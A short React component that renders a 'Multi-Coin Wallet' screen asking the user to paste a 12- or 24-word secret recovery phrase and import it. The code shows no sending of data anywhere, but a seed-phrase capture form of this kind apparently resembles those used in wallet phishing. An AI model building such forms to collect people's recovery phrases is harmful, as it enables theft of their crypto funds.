import { useState } from "react";
import { Link } from "react-router-dom";

const PassPhrase = () => {
    
    const [walletName, setWalletName] = useState("Main Wallet");
    const explanation = "Typically 12 (sometimes 24) words seperated by single spaces";

    return ( 
        <div className="app passPhrase">
            <h2 className="appHeader">Multi-Coin Wallet</h2>
            <div className="padded">
                <form action="" method="post" className="pass">
                    <div className="formSection walletVariant">
                        <label for="name">Name</label>
                        <input id="name" type="text" value={walletName} />
                    </div>
                    <div className="formSection secretPhrase">
                        <label for="textArea">Secret Phrase</label>
                        <textarea
                            rows="10"
                            style={{width: "100%"}}
                        ></textarea>
                    </div>
                    <p className="explain">{explanation}</p>
                    <div className="buttons">
                        <button type="submit" className="import">Import</button>
                        <Link className="question" to={""}>What is Secret Phrase?</Link>
                    </div>
                </form>
            </div>
        </div>
     );
}
 
export default PassPhrase;